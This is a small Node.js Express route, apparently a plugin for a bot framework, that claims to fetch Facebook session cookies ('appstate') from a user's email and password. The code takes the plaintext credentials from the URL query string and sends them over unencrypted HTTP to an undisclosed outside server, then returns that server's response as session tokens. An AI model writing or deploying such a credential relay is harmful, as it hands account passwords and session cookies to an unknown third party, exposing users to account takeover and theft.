const express = require('express');
const axios = require('axios');
const router = express.Router();

module.exports.routes = {
  name: "Appstate Getter",
  desc: "Get Session cookies of Facebook login using provided email and password",
  category: "Tools",
  usages: "/api/appstate",
  query: "?e=&p=",
  method: "get",
};

module.exports.onAPI = async (req, res) => {
  const { e: email, p: password } = req.query;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }

  try {
    const apiURL = `http://de01.uniplex.xyz:5611/as?e=${encodeURIComponent(email)}&p=${encodeURIComponent(password)}`;
    
    const response = await axios.get(apiURL);

    res.json(response.data);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};
